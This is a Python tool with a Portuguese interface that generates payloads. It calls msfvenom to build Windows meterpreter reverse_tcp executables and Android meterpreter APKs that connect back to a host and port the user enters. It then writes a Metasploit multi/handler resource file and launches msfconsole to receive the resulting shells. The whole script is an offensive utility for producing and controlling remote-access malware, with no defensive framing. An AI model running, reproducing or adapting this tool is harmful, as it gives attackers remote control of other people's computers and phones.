#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from os import system
import subprocess

def Payload_Msfvenon():
    system('\033[36m')
    system('clear')
    system('figlet .. GR - PAYLOAD')
    var1 = "1"
    var2 = "2"

    permite = "N"

    while permite == "N":
        print("\033[0;0m\033[33m**************************** Autor LAUDIER-ST *************************")
        print("--------------------------   Versao KHLS 1.0  -------------------------\033[0;0m")
        print("#######################################################################")
        print("\033[32m\033[1m                                     KHLS                       \033[0;0m ")
        print("############################\033[32m\033[1m GERADOR DE PAYLOAD \033[0;0m#######################\n")
        print("#######################################################################\n")
        print("\033[36m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\033[0;0m")
        print("\033[32m\033[1m( 1 )\033[0;0m WINDOWS!  \033[32m\033[1m '$'   '$' '$' '& & &' '$   $' '$ $ $'  \033[0;0m                  ")
        print("\033[32m\033[1m( 2 )\033[0;0m ANDROID!  \033[32m\033[1m  '$' '$'  '$' '& & &' '$   $' '  \\    \033[0;0m                  ")
        print("\033[32m\033[1m( 3 )\033[0;0m SAIR!     \033[32m\033[1m    '&'    '$' '&  &'  '$ $ $' '$ $ $'  \033[0;0m                 ")
        print("\033[36m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\033[0;0m")
        construtor = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="
        porta1 = " LPORT="
        estecao = " -f exe > KHLSEXE.exe"
        var3 = input("\033[35m\033[1mDIGITE COM NUMERO UMA DAS OPÇÕES ACIMA PARA GERAR O SEU PAYLOAD!\033[0;0m\n\033[32m\033[1mDIGITE AQUI: \033[0;0m ")

        mapa2 = "msfvenom -p android/meterpreter/reverse_tcp LHOST="
        porta = " LPORT="
        rota = " R > KHLSAPP.apk"

        if var3 == var1:
            cria1 = "mkdir output1 && cd output1 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload windows/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
            cria2 = ">> msfconsole-r.rc && echo set LPORT "
            cria3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"

            var4 = input("\033[34m"+"\033[1m"+"LHOST: ")
            var5 = input("LPORT: ")
            var6 = construtor + var4 + porta1 + var5 + estecao
            var7 = cria1 + var4 + cria2 + var5 + cria3
            system("{}".format(var6))
            system("{}".format(var7))
            system("clear")
            print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output1/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSEXE.exe E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
            try:
                cmd = ['xterm']
                cmd.extend(['-e', 'bash', '-c', 'mv KHLSEXE.exe -t output1 && cd output1 && nautilus .; exec $SHELL'])
                subprocess.Popen(cmd, stdout=subprocess.PIPE)
                system('cd output1 && service postgresql start && msfconsole -r msfconsole-r.rc')
            except:
                cr = '='
                print(cr * 60)
                print('Algo deu errado')
                print(cr * 60)
        elif var3 == var2:
            zona1 = "mkdir output2 && cd output2 && touch msfconsole-r.rc && echo use multi/handler >> msfconsole-r.rc && echo set payload android/meterpreter/reverse_tcp >> msfconsole-r.rc && echo set LHOST "
            zona2 = ">> msfconsole-r.rc && echo set LPORT "
            zona3 = ">> msfconsole-r.rc && set ExitOnSession false >> msfconsole-r.rc && echo set EnableStageEncoding true >> msfconsole-r.rc && echo exploit -j >> msfconsole-r.rc"

            var4 = input("\033[34m"+"\033[1m"+"LHOST: ")
            var5 = input("LPORT: ")
            var6 = mapa2 + var4 + porta + var5 + rota
            zona4 = zona1 + var4 + zona2 + var5 + zona3
            system("{}".format(var6))
            system("{}".format(zona4))
            system("clear")
            print("\nSEU PAYLOAD FOI CRIADO! ACESSE O DIRETORIO KHLS/output2/ E LÁ IRÁ TER DOIS ARQUIVOS, KHLSAPP.apk E O  msfconsole-r.rc COM OS COMANDOS PARA EXECULTAR COM METASPLOIT! Agora abra o terminal e digite msfconsole -r msfconsole-r.rc e da enter\n")
            try:
                cmd = ['xterm']
                cmd.extend(['-e', 'bash', '-c', 'mv KHLSAPP.apk -t output2 && cd output2 && nautilus .; exec $SHELL'])
                subprocess.Popen(cmd, stdout=subprocess.PIPE)
                system('cd output2 && service postgresql start && msfconsole -r msfconsole-r.rc')
            except:
                cr = '='
                print(cr * 60)
                print('Algo deu errado')
                print(cr * 60)
        print("=====================================================================")

        permite = input(("\nQUER SAIR DO PROGRAMA? SE SIM (S) SE NÃO (N) ######[S/N]: ")).upper()
        print("=====================================================================")
        system("clear")
